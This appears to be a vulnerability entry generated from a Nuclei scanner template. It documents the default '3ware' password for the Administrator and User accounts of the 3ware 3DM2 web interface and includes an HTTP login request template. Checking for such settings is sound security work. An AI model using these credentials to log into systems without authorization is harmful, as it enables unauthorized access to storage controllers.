# Vulnerability: 3ware Controller 3DM2 - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`3ware-default-login.yaml`)

## Description
The default password for logging in to the 3DM2 web interface of a 3ware controller is "3ware" for both the Administrator and User accounts.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

whopwd={{username}}&thepwd={{password}}
```

